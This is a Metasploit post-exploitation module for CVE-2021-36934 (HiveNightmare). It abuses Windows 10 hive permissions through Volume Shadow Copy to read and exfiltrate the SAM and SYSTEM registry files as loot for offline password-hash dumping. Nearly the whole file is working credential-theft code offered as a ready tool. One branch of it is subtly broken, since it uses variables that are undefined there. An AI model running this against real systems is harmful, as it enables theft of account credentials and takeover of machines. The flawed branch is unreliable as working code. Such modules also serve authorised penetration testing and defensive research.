##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows SAM secrets leak - HiveNightmare',
        'Description' => %q{
          Due to mismanagement of SAM and SYSTEM hives in Windows 10, it is possible for an unprivileged
          user to read those files. But, as they are locked while Windows is running we are not able
          to read them directly. The trick is to take advantage of Volume Shadow Copy, which is generally
          enabled, to finally have a read access. Once SAM and SYSTEM files are successfully dumped and
          stored in `store_loot`, you can dump the hashes with some external scripts like secretsdump.py
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kevin Beaumont', # Discovery and original POC on www.github.com
          'romarroca', # POC on www.github.com
          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
        ],
        'References' => [
          ['CVE', '2021-36934'],
          ['URL', 'https://github.com/GossiTheDog/HiveNightmare'],
          ['URL', 'https://isc.sans.edu/diary/Summer+of+SAM+-+incorrect+permissions+on+Windows+1011+hives/27652'],
          ['URL', 'https://github.com/romarroca/SeriousSam']
        ],
        'DisclosureDate' => '2021-07-20',
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'AKA' => [ 'HiveNightmare', 'SeriousSAM' ],
          'Reliability' => [ ],
          'SideEffects' => [ ],
          'Stability' => [ CRASH_SAFE ]
        }
      )
    )
    register_options([
      OptInt.new('ITERATIONS', [true, 'Number of iterations on Shadow Copy file index', 10]),
      OptInt.new('FILE_INDEX', [false, 'Optional index parameter to retrieve a specific Shadow Copy file', nil])
    ])
  end

  def check_path(path)
    r = session.railgun.kernel32.CreateFileA(path, 'GENERIC_READ', 0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_NORMAL', nil)
    if r['GetLastError'] == 0
      return r['return']
    end

    nil
  end

  def read_file(handle)
    buffer_size = 100000

    res_reading = client.railgun.kernel32.ReadFile(handle, buffer_size, buffer_size, 4, nil)
    data = res_reading['lpBuffer'][0...res_reading['lpNumberOfBytesRead']]

    while res_reading['lpNumberOfBytesRead'] == buffer_size
      res_reading = client.railgun.kernel32.ReadFile(handle, buffer_size, buffer_size, 4, nil)
      data += res_reading['lpBuffer'][0...res_reading['lpNumberOfBytesRead']]
    end
    client.railgun.kernel32.CloseHandle(handle)
    data
  end

  def loot_files(sam_handle, index)
    path = store_loot(
      'windows.sam',
      '',
      session,
      read_file(sam_handle)
    )
    print_good("SAM data saved at #{path}")

    handle = check_path("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy#{index}\\Windows\\System32\\config\\SYSTEM")
    fail_with(Failure::UnexpectedReply, "Can't open SYSTEM file!") unless handle
    path = store_loot(
      'windows.system',
      '',
      session,
      read_file(handle)
    )
    print_good("SYSTEM data saved at #{path}")
    print_good('SAM and SYSTEM data were leaked!')
  end

  def run
    if datastore['FILE_INDEX']
      fail_with(Failure::BadConfig, 'Please specify a non-negative file index!') unless datastore['FILE_INDEX'] >= 0

      handle = check_path("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy#{datastore['FILE_INDEX']}\\Windows\\System32\\config\\SAM")
      if handle
        print_good("SAM data found in HarddiskVolumeShadowCopy#{i}!")
        print_good("Retrieving files of index #{index_most_recent_shadow_copy}...")
        loot_files(handle, datastore['FILE_INDEX'])
      end
    else
      fail_with(Failure::BadConfig, 'Please specify an iteration number greater than 0!') unless datastore['ITERATIONS'] > 0

      most_recent_time = nil
      most_recent_shadow_copy = nil
      index_most_recent_shadow_copy = -1

      for i in 0..datastore['ITERATIONS']
        handle = check_path("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy#{i}\\Windows\\System32\\config\\SAM")

        next unless handle

        print_good("SAM data found in HarddiskVolumeShadowCopy#{i}!")
        tmp_time = client.railgun.kernel32.GetFileTime(handle, 4, 4, 4)['lpLastWriteTime']

        next unless (index_most_recent_shadow_copy == -1) || (client.railgun.kernel32.CompareFileTime(most_recent_time, tmp_time)['return'] < 0)

        if most_recent_shadow_copy
          client.railgun.kernel32.CloseHandle(most_recent_shadow_copy)
        end

        most_recent_time = tmp_time
        most_recent_shadow_copy = handle
        index_most_recent_shadow_copy = i
      end

      if index_most_recent_shadow_copy != -1
        print_good("Retrieving files of index #{index_most_recent_shadow_copy} as they are the most recently modified...")
        loot_files(most_recent_shadow_copy, index_most_recent_shadow_copy)
      else
        print_error('No Shadow Copy files were found! Maybe you can try again with a greater iteration number...')
      end
    end
  end
end
